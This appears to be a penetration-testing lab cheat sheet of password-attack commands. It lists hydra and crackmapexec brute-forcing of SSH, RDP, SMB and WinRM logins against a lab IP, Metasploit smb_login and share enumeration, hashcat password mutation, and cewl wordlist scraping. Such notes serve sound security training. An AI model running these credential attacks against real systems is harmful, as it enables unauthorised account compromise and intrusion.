# Network Services

## Crackmap

```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

## SSH&#x20;

```
hydra -L user.list -P password.list ssh://10.129.42.197
```

## RDP&#x20;

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```

## SMB

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197

or

msfconsole 

use smb_login

crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

## Hashcat&#x20;

{% code title="Mutated Password list " %}
```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

ls /usr/share/hashcat/rules/
```
{% endcode %}

## CEWL&#x20;

```shell-session
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist
```
